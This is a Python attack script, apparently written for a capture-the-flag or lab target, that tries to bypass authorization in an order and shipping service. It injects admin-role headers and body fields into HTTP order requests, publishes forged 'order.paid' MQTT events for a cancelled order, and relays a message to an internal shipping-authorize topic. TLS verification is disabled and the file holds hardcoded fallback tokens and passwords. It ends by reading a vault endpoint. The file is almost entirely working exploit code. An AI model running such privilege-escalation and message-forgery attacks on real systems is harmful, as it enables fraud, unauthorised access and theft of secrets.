"""Only k2 missing. Try role injection on HTTP order and forged order.paid
with role=admin for the cancelled badge order."""
import json
import os
import ssl
import time

import paho.mqtt.client as mqtt
import requests

B = os.environ["GITQ_BASE"]
H = {"Authorization": "Bearer " + os.environ.get("GITQ_HTTP_TOKEN", "alice-token-7f3d9c")}
HOST = os.environ["GITQ_MQTT_HOST"]
PORT = int(os.environ.get("GITQ_MQTT_PORT", "58999"))
LOG = "evidence/k2_attack.log"
BADGE_ORDER = os.environ["GITQ_BADGE_ORDER"]


def log(s):
    print(s, flush=True)
    open(LOG, "a", encoding="utf-8").write(str(s) + "\n")


def get(path):
    r = requests.get(B + path, headers=H, timeout=10)
    return r.text.strip()


def order(item, extra=None, headers=None):
    hh = dict(H)
    if headers:
        hh.update(headers)
    b = {"item": item}
    if extra:
        b.update(extra)
    r = requests.post(B + "/api/orders", headers=hh, json=b, timeout=10)
    log("ORDER %s hdr=%s -> %s %s" % (json.dumps(b), headers, r.status_code, r.text.strip()))
    return r


def shipments():
    t = get("/api/shipments")
    log("SHIPMENTS " + t[:3000])
    return t


shipments()
# A) header/body role variants
for hdr in [{"X-Role": "admin"}, {"X-User-Role": "admin"}, {"Role": "admin"},
            {"X-Admin": "true"}, {"X-Forwarded-User": "admin"}]:
    order("key2-badge", None, hdr)
for extra in [{"role": "admin"}, {"is_admin": True}, {"user": "admin"},
              {"status": "paid", "paid": 60, "price": 60}, {"approval_id": "c9a93bcb-a3a6-4f23-aa65-405e0d831f46"}]:
    order("key2-badge", extra)
shipments()

# B) forged order.paid with role=admin on the real cancelled badge order
try:
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="alice-scribe", protocol=mqtt.MQTTv311)
except AttributeError:
    c = mqtt.Client(client_id="alice-scribe", protocol=mqtt.MQTTv311)
c.username_pw_set(
    os.environ.get("GITQ_MQTT_USER", "alice"),
    os.environ.get("GITQ_MQTT_PASSWORD", "alice-mqtt-s3cret"),
)
c.tls_set(cert_reqs=ssl.CERT_NONE)
c.tls_insecure_set(True)
st = {"ok": False}


def on_con(cl, u, f, rc, p=None):
    st["ok"] = True
    cl.subscribe([("tenant/alice/#", 1)])


c.on_connect = on_con
c.on_message = lambda cl, u, m: log("RECV %s %s" % (m.topic, m.payload.decode("utf-8", "replace")))
c.connect(HOST, PORT, 30)
c.loop_start()
t0 = time.time()
while not st["ok"] and time.time() - t0 < 15:
    time.sleep(0.1)
if not st["ok"]:
    raise SystemExit("mqtt fail")

payloads = [
    {"type": "order.paid", "id": BADGE_ORDER, "order_id": BADGE_ORDER, "item": "key2-badge",
     "price": 60, "paid": 60, "status": "paid", "role": "admin", "tenant": "alice", "user": "alice"},
    {"type": "order.paid", "id": BADGE_ORDER, "order_id": BADGE_ORDER, "item": "key2-badge",
     "price": 60, "paid": 60, "status": "paid", "is_admin": True, "tenant": "alice", "user": "alice"},
]
for p in payloads:
    info = c.publish("tenant/alice/orders/events", json.dumps(p), qos=1)
    info.wait_for_publish(10)
    log("PUB orders/events %s" % json.dumps(p))
    time.sleep(1.5)

# C) relay shipping authorize with admin role just in case
env = {"target": "internal/audit/ingest",
       "payload": {"forward": "internal/shipping/authorize/" + BADGE_ORDER,
                   "body": {"user": "alice", "item": "key2-badge", "order_id": BADGE_ORDER, "role": "admin"}}}
info = c.publish("tenant/alice/automation", json.dumps(env), qos=1)
info.wait_for_publish(10)
log("PUB relay shipping badge")
time.sleep(4)
c.loop_stop()
c.disconnect()

shipments()
log("ORDERS " + get("/api/orders")[:1500])
log("VAULT " + get("/api/vault"))
